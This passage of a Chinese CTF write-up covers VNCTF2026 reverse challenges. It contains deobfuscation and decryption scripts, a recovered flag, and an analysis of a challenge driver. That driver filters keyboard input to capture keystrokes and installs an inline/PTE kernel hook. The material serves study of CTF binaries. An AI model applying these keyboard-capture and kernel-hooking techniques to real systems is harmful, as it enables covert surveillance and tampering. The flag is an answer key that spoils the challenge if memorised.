0x100000000</span><br></pre></td></tr></table></figure><p>记录一下出题人的脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;idc.idc&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="title function_">NopCode</span><span class="params">(Addr, Length)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">auto</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; Length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        PatchByte(Addr + i, <span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">auto</span> seg;</span><br><span class="line">    <span class="comment">// 遍历所有段</span></span><br><span class="line">    <span class="keyword">for</span> (seg = get_first_seg(); seg != BADADDR; seg = get_next_seg(seg))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 获取段名称</span></span><br><span class="line">        <span class="keyword">auto</span> seg_name = get_segm_name(seg);</span><br><span class="line">        msg(seg_name + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (seg_name == <span class="string">&quot;.text&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 从当前段头地址开始遍历</span></span><br><span class="line">            <span class="keyword">auto</span> current_addr = seg;</span><br><span class="line">            <span class="comment">// 结束地址</span></span><br><span class="line">            <span class="keyword">auto</span> end_addr = current_addr + <span class="number">0x10000</span>;</span><br><span class="line">            <span class="keyword">while</span> (current_addr != BADADDR &amp;&amp; current_addr &lt; end_addr)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">auto</span> current_byte = Byte(current_addr);</span><br><span class="line">                <span class="keyword">auto</span> op = Word(current_addr + <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">auto</span> next = Word(current_addr + <span class="number">7</span>);</span><br><span class="line">                <span class="keyword">auto</span> call = Byte(current_addr + <span class="number">23</span>);</span><br><span class="line">                <span class="keyword">auto</span> jz = Byte(current_addr + <span class="number">23</span>);</span><br><span class="line">                <span class="comment">// call + retn</span></span><br><span class="line">                <span class="comment">//设置一些条件判断是否为我们想处理的地方</span></span><br><span class="line">                <span class="keyword">if</span>(current_byte == <span class="number">0x4C</span> &amp;&amp; op == <span class="number">0x158D</span> &amp;&amp; next == <span class="number">0xBB41</span> &amp;&amp; call == <span class="number">0xE8</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">auto</span> offest1 = Dword(current_addr + <span class="number">3</span>);</span><br><span class="line">                    <span class="keyword">auto</span> offest_neg = Byte(current_addr + <span class="number">6</span>);</span><br><span class="line">                    <span class="keyword">auto</span> addr = offest1 + <span class="number">4</span> + <span class="number">7</span> - <span class="number">5</span>;</span><br><span class="line">                    <span class="keyword">auto</span> gar_code = offest1 + <span class="number">7</span> + current_addr; <span class="comment">// 计算出垃圾指令的位置</span></span><br><span class="line">                    <span class="keyword">if</span>(offest_neg == <span class="number">0xFF</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        gar_code = gar_code - <span class="number">0x100000000</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    NopCode(current_addr,<span class="number">35</span>); <span class="comment">// nop掉从lea开头到retn结尾的所有代码</span></span><br><span class="line">                    NopCode(gar_code,<span class="number">4</span>); <span class="comment">// nop掉四字节垃圾指令</span></span><br><span class="line">                    PatchByte(current_addr,<span class="number">0xE9</span>); <span class="comment">// 改为jmp指令</span></span><br><span class="line">                    PatchDword(current_addr + <span class="number">1</span>,addr); <span class="comment">// jmp跳转的偏移</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// jz jnz</span></span><br><span class="line">                <span class="keyword">if</span>(current_byte == <span class="number">0x4C</span> &amp;&amp; op == <span class="number">0x158D</span> &amp;&amp; next == <span class="number">0xBB41</span> &amp;&amp; jz == <span class="number">0x74</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    offest1 = Dword(current_addr + <span class="number">3</span>);</span><br><span class="line">                    offest_neg = Byte(current_addr + <span class="number">6</span>);</span><br><span class="line">                    addr = offest1 + <span class="number">4</span> + <span class="number">7</span> - <span class="number">5</span>;</span><br><span class="line">                    gar_code = offest1 + <span class="number">7</span> + current_addr;</span><br><span class="line">                    <span class="keyword">if</span>(offest_neg == <span class="number">0xFF</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        gar_code = gar_code - <span class="number">0x100000000</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//msg(&quot;code : %X\n&quot;,gar_code);</span></span><br><span class="line">                    NopCode(current_addr,<span class="number">30</span>);</span><br><span class="line">                    NopCode(gar_code,<span class="number">4</span>);</span><br><span class="line">                    PatchByte(current_addr,<span class="number">0xE9</span>);</span><br><span class="line">                    PatchDword(current_addr + <span class="number">1</span>,addr);</span><br><span class="line">                &#125;</span><br><span class="line">                current_addr = current_addr + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>addr &#x3D; offest1 + 4 + 7 - 5 本质是在算把这段lea&#x2F;add&#x2F;jmp r10改成一条 E9 rel32 近跳时，rel32 应该填多少</p><p>对应关系是：</p><ol><li><p>4C 8D 15 xx xx xx xx 是 lea r10, [rip+disp32]，disp32 &#x3D; offest1  x64 的 RIP 相对寻址基址是下一条指令地址，所以</p><p>lea_target &#x3D; current_addr + 7 + sign_extend(offest1)</p><blockquote><p>15  &#x3D; ModRM：<code>mod=00, reg=edx, rm=101</code></p><p><code>mod = 00</code> 且 <code>rm = 101</code><strong>不是绝对地址</strong>，而是：<code>[RIP + disp32]</code> 所以是相对寻址</p><p>RIP 不是当前指令的地址 ，RIP &#x3D; 当前指令地址 + 当前指令长度</p></blockquote></li><li><p>mov r11d, A; xor r11d, B 的结果通常是常数，这里就是 4，所以 real_target &#x3D; lea_target + 4 &#x3D; current_addr + 7 + offest1 + 4</p></li><li><p>要patch 成 E9 rel32，E9 指令长度是 5，rel32 的基址是 current_addr + 5：</p><p>current_addr + 5 + rel32 &#x3D; real_target  所以  rel32 &#x3D; real_target - (current_addr + 5) &#x3D; offest1 + 4 + 7 - 5</p></li></ol><p>执行脚本过后还是有很多一大块一大块的数据段 我们可以对其取消定义转为数据先(当然也可以用到时再处理)</p><p>官解：</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260206163809642.png" alt="image-20260206163809642"></p><p>但这里可能有人会有误解，以为一定要从54BB开始，实际上我们可以选择这个函数开始</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260206163905115.png" alt="image-20260206163905115"></p><p>我们对其上述操作后，如果反编译失败，一层层进去找，中间会有分支比如分支到54BB的这个函数中，这时候就是对54BB这个函数做这样的处理，搞了十几分钟差不多能处理完</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260206164040514.png" alt="image-20260206164040514"></p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260206164100866.png" alt="image-20260206164100866"></p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260206164140901.png" alt="image-20260206164140901"></p><p>但不清楚为什么效果没有出题人处理的这么好 起码能看了</p><p>还发现</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260206170207063.png" alt="image-20260206170207063"></p><p>发现还有个引用(没有的话说明你之前代码恢复的不全)</p><blockquote><p>或者我们手动patch到一起也行</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260211124710599.png" alt="image-20260211124710599"></p></blockquote><p>还发现那个脚本没有去除这里的混淆</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260206170515677.png" alt="image-20260206170515677"></p><p>修复技巧</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260211125108084.png" alt="image-20260211125108084"></p><p>这里乱七八糟的头其实有问题 应该以push rbp为头部</p><p>需要手动检查</p><p>然后这下面这个我看了下我这部分的代码搞不出来不知道什么情况 这里的话应该是个SMC</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260211134008265.png" alt="image-20260211134008265"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> data[] = &#123;<span class="number">0x738EA1B9</span>, <span class="number">0xF5B06584</span>, <span class="number">0xDCF952D5</span>, <span class="number">0x6FC28041</span>, <span class="number">0x1DA40CF1</span>, <span class="number">0x07572A62</span>, <span class="number">0xB4C49903</span>, <span class="number">0x9BA536D8</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> key[] = &#123;<span class="number">0xF9B2917F</span>, <span class="number">0x2A9D0847</span>, <span class="number">0x0C874A13</span>, <span class="number">0xA0253AD3</span>&#125;;</span><br><span class="line">    <span class="type">int</span> sum = (<span class="number">32</span> * <span class="number">0x61C88647</span>) * <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">6</span>; i &gt;= <span class="number">0</span>; i -= <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> A = data[i];</span><br><span class="line">        <span class="type">uint32_t</span> B = data[i + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            A += (B + ((<span class="number">16</span> * B) ^ (B &gt;&gt; <span class="number">5</span>))) ^ (key[sum &amp; <span class="number">3</span>] + sum);</span><br><span class="line">            sum -= <span class="number">0x61C88647</span>;</span><br><span class="line">            B += (A + ((<span class="number">16</span> * A) ^ (A &gt;&gt; <span class="number">5</span>))) ^ (key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + sum);</span><br><span class="line">        &#125;</span><br><span class="line">        data[i] = A;</span><br><span class="line">        data[i + <span class="number">1</span>] = B;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,(data[i] &gt;&gt; (j * <span class="number">8</span>)) &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// VNCTF&#123;N0w_Y0u_Kn0w_SMC_4nd_@bf!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Shadow"><a href="#Shadow" class="headerlink" title="Shadow"></a>Shadow</h2><p><a href="https://tkazer.github.io/2026/02/02/VNCTF2026-Shadow-WP/">VNCTF2026-Shadow-WP | Liv’s blog</a></p><p>Maze.exe一个简单迷宫</p><p>sys分析下</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260215233212444.png" alt="image-20260215233212444"></p><p>Findcrypt发现AES</p><p>sub_14000C000从全局 Pool 拷贝 0x5E00 字节，然后调用 sub_140001168 做 16 字节分组变换</p><p>确认是 AES 轮函数（S-box 在 0x140004000，Rcon 在 0x140003070，密钥在 dword_14000A000）</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260215233457807.png" alt="image-20260215233457807"></p><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>AI搓个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pefile</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="comment"># Challenge-specific RVAs from stage1 sys.</span></span><br><span class="line">KEY_RVA = <span class="number">0xA000</span></span><br><span class="line">ENC_BLOB_RVA = <span class="number">0x4200</span></span><br><span class="line">ENC_BLOB_SIZE = <span class="number">0x5E00</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_rva_bytes</span>(<span class="params">pe: pefile.PE, rva: <span class="built_in">int</span>, size: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    offset = pe.get_offset_from_rva(rva)</span><br><span class="line">    data = pe.__data__[offset : offset + size]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) != size:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;read size mismatch @RVA <span class="subst">&#123;<span class="built_in">hex</span>(rva)&#125;</span>: got <span class="subst">&#123;<span class="built_in">len</span>(data)&#125;</span>, want <span class="subst">&#123;size&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_pe_image</span>(<span class="params">buf: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(buf) &lt; <span class="number">0x40</span> <span class="keyword">or</span> buf[:<span class="number">2</span>] != <span class="string">b&quot;MZ&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    e_lfanew = <span class="built_in">int</span>.from_bytes(buf[<span class="number">0x3C</span>:<span class="number">0x40</span>], <span class="string">&quot;little&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> e_lfanew + <span class="number">4</span> &lt;= <span class="built_in">len</span>(buf) <span class="keyword">and</span> buf[e_lfanew : e_lfanew + <span class="number">4</span>] == <span class="string">b&quot;PE\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;Recover stage2 PE directly from stage1 .sys&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;sys_path&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;path to stage1 driver (.sys)&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-o&quot;</span>, <span class="string">&quot;--out&quot;</span>, default=<span class="string">&quot;./stage2_driver.bin&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;output stage2 file&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    pe = pefile.PE(args.sys_path, fast_load=<span class="literal">False</span>)</span><br><span class="line">    key = read_rva_bytes(pe, KEY_RVA, <span class="number">16</span>)</span><br><span class="line">    enc_blob = read_rva_bytes(pe, ENC_BLOB_RVA, ENC_BLOB_SIZE)</span><br><span class="line"></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    cand_encrypt = cipher.encrypt(enc_blob)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(args.out, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(cand_encrypt)</span><br><span class="line"></span><br><span class="line">    e_lfanew = <span class="built_in">int</span>.from_bytes(cand_encrypt[<span class="number">0x3C</span>:<span class="number">0x40</span>], <span class="string">&quot;little&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(cand_encrypt[:<span class="number">2</span>], cand_encrypt[e_lfanew : e_lfanew + <span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>解密PE文件后，进行PE拉伸、重定位修复、IAT修复、调用DriverEntry，一系列操作进行手动加载该PE文件到内存中运行，具体实现原理可以网上搜”反射注入”，实际就是手动实现加载并运行程序。from liv</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260218220159318.png" alt="image-20260218220159318"></p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260218220229531.png" alt="image-20260218220229531"></p></blockquote><p>关注sub_140001C10函数</p><p>sub_140001C10中有个解码字符串函数</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260218225543154.png" alt="image-20260218225543154"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode_obf</span>(<span class="params">data, key</span>):</span><br><span class="line">    b = <span class="built_in">bytearray</span>(data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">        b[i] ^= ((i % <span class="number">0x0D</span>) + key) &amp; <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(b)</span><br><span class="line"></span><br><span class="line">arr1 = [</span><br><span class="line">    <span class="number">0xF1</span>,<span class="number">0xBB</span>,<span class="number">0xD9</span>,<span class="number">0xBD</span>,<span class="number">0xFA</span>,<span class="number">0xBF</span>,<span class="number">0xA5</span>,<span class="number">0xC1</span>,<span class="number">0xAE</span>,<span class="number">0xC3</span>,<span class="number">0xA5</span>,<span class="number">0xC5</span>,<span class="number">0xBF</span>,<span class="number">0xBA</span>,<span class="number">0xFE</span>,<span class="number">0xBC</span>,</span><br><span class="line">    <span class="number">0xC5</span>,<span class="number">0xBE</span>,<span class="number">0xDA</span>,<span class="number">0xC0</span>,<span class="number">0xA2</span>,<span class="number">0xC2</span>,<span class="number">0xB6</span>,<span class="number">0xC4</span>,<span class="number">0xB1</span>,<span class="number">0xC6</span>,<span class="number">0xD3</span>,<span class="number">0xBB</span>,<span class="number">0xD3</span>,<span class="number">0xBD</span>,<span class="number">0xD0</span>,<span class="number">0xBF</span>,</span><br><span class="line">    <span class="number">0x94</span>,<span class="number">0xC1</span>,<span class="number">0xAA</span>,<span class="number">0xC3</span>,<span class="number">0xB6</span>,<span class="number">0xC5</span>,<span class="number">0xA3</span>,<span class="number">0xBA</span>,<span class="number">0xDA</span>,<span class="number">0xBC</span>,<span class="number">0xD9</span>,<span class="number">0xBE</span>,<span class="number">0xBF</span>,<span class="number">0xC0</span></span><br><span class="line">]</span><br><span class="line"><span class="built_in">print</span>(decode_obf(arr1, <span class="number">0xBA</span>).decode(<span class="string">&quot;utf-16le&quot;</span>).rstrip(<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">arr2 = [</span><br><span class="line">    <span class="number">0xCC</span>,<span class="number">0x91</span>,<span class="number">0xD6</span>,<span class="number">0x93</span>,<span class="number">0xF1</span>,<span class="number">0x95</span>,<span class="number">0xE0</span>,<span class="number">0x97</span>,<span class="number">0xF1</span>,<span class="number">0x99</span>,<span class="number">0xF9</span>,<span class="number">0x9B</span>,<span class="number">0xF9</span>,<span class="number">0x90</span>,<span class="number">0xCD</span>,<span class="number">0x92</span>,</span><br><span class="line">    <span class="number">0xD8</span>,<span class="number">0x94</span>,<span class="number">0xF0</span>,<span class="number">0x96</span>,<span class="number">0xEE</span>,<span class="number">0x98</span>,<span class="number">0xFB</span>,<span class="number">0x9A</span>,<span class="number">0xF4</span>,<span class="number">0x9C</span>,<span class="number">0xF1</span>,<span class="number">0x91</span>,<span class="number">0xE0</span>,<span class="number">0x93</span>,<span class="number">0xF0</span>,<span class="number">0x95</span>,</span><br><span class="line">    <span class="number">0xD5</span>,<span class="number">0x97</span>,<span class="number">0xF4</span>,<span class="number">0x99</span>,<span class="number">0xFB</span>,<span class="number">0x9B</span>,<span class="number">0xEF</span>,<span class="number">0x90</span>,<span class="number">0xE2</span>,<span class="number">0x92</span>,<span class="number">0xA3</span>,<span class="number">0x94</span>,<span class="number">0x95</span>,<span class="number">0x96</span></span><br><span class="line">]</span><br><span class="line"><span class="built_in">print</span>(decode_obf(arr2, <span class="number">0x90</span>).decode(<span class="string">&quot;utf-16le&quot;</span>).rstrip(<span class="string">&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure><p>在 sub_140001C10 中解码出两个关键字符串：</p><ul><li>KeDelayExecutionThread</li><li>\Device\KeyboardClass0</li></ul><p>0x61004D 的内存字节是：4D 00 61 00 -&gt; UTF-16LE 就是 “M” “a”</p><p>0x65007A 的内存字节是：7A 00 65 00 -&gt; UTF-16LE 就是 “z” “e”</p><p>枚举 PID 12..0xFFFFF，通过 SeLocateProcessImageName 找进程名为 Maze（比较 M a z e）。</p><p>SystemRoutineAddress &#x3D; MmGetSystemRoutineAddress(&amp;DestinationString);</p><blockquote><p>在内核里按名字查找 KeDelayExecutionThread 这个系统例程的地址</p><p><code>MmGetSystemRoutineAddress</code> 是 Windows 内核提供的一个函数。</p><p>根据函数名字符串，返回该内核导出函数的地址。类似于用户态里的GetProcAddress</p><p>KeDelayExecutionThread 让当前线程延迟一段时间</p></blockquote><p>找到后调用 sub_140003F80 安装 hook；</p><ul><li>创建设备对象（IoCreateDevice，类型 0x0B &#x3D; 键盘）并 IoAttachDevice 到 \Device\KeyboardClass0。</li><li>MajorFunction 默认走 sub_1400010A0（直接转发）。</li><li>IRP_MJ_READ（索引 3）走 sub_140001100，设置 completion routine CompletionRoutine (0x1400017D0) 后转发。</li></ul><p>sub_140003F80 本质上是“安装内联 Hook + 建立可恢复上下文”的函数。在当前样本里它是给 KeDelayExecutionThread 装钩子（由 sub_140001C10 传进来）。</p><p>它主要做这几件事：</p><ol><li>PsLookupProcessByProcessId 拿到目标进程（Maze）的 PEPROCESS。</li><li>分配一个上下文结构（0xC0），调用 sub_140003B50 做页表相关准备（含保存原始页表项、必要时处理大页&#x2F;重映射）。</li><li>用 sub_140002470 从目标函数入口开始反汇编，累计到至少 14 字节（保证覆盖完整指令）。</li><li>保存原始前导字节，并构造 trampoline（原始字节 + 跳回 原函数+len），把 trampoline 指针写到 *a5。</li><li>构造 14 字节跳板并写回目标函数入口（sub_140003E80）：<br>FF 25 00 00 00 00 + 8字节hook地址（这里是 sub_1400012C0）。</li><li>把上下文挂到全局链表（供卸载时恢复），成功返回 1；任一步失败返回 0。</li></ol><blockquote><p>然后对该进程，进行对KeDelayExecutionThread函数单独隔离的Pte hook，Pte hook的特性就是对ntdll函数进行hook，但仅对该进程生效，hook替换成另一个函数。<a href="https://xz.aliyun.com/news/18999">PTE Hook：一种利用页表重映射攻击实现的内核函数Hook-先知社区</a></p></blockquote><p>键盘数据处理</p><p>IoAttachDevice(DeviceObject, &amp;TargetDevice, &amp;AttachedDevice)这说明它把自己挂到键盘类设备栈上，做键盘过滤</p><p>Sub_140001100 是这个驱动专门处理 IRP_MJ_READ（读请求）的分发函数，本质是带回调的转发器</p><blockquote><p>核心回调就是CompletionRoutine函数</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260218232308422.png" alt="image-20260218232308422"></p><p>返回缓冲按 KEYBOARD_INPUT_DATA 解析：count &#x3D; IoStatus.Information &#x2F; 0xC。</p><p>逐条读取扫描码 n0x54 和标志位：</p><ul><li>扫描码 0x2A&#x2F;0x36（左右 Shift）用于更新 byte_140006BA5（Shift 状态）。</li><li>只处理按下事件（Flags &amp; 1 &#x3D;&#x3D; 0），忽略松开事件。</li></ul><p>扫描码转字符：</p><ul><li>未按 Shift 用 byte_140005170。</li><li>按 Shift 用 byte_1400051D0。</li></ul><p>若转换出字符且采集开关 byte_140006BA4 为真，就写入 Source2[dword_140006BA8++]。</p><p>扫描码 0x58（F12）作为采集开关：</p><ul><li>打开时：清空 Source2 和长度，打印 “[LDriver] on input.\n”（字符串先解码）。</li><li>关闭时：打印 “[LDriver] input end.\n”（同样先解码）。</li></ul><blockquote><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260218232355910.png" alt="image-20260218232355910"></p></blockquote><p>交叉引用该函数可以到sub_1400012C0</p><p>分析逻辑可得解密代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 